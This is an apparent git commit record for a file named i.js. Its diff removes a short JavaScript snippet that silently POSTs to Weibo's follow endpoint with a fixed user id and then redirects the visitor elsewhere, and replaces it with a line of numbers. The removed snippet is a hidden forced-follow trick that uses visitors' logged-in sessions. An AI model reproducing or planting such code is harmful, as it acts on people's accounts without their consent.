4bfe20a323aad17bb6ee796fe99baee59ab96976
opensourcessss <fuxuemin888@126.com>
2019-11-24 18:35:24 +0800

    Update i.js

--- i.js
+++ i.js
@@ -1,5 +1,1 @@
-    var x = new XMLHttpRequest();
-    x.open('post', 'https://huodong.weibo.com/aj_public/follow' );
-    x.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-    x.send('uid=6421536602');
-    window.location.href="http://m.so.com/mhtml/zt/hotlist.html";
+2,4442087501623163,4439907017412328
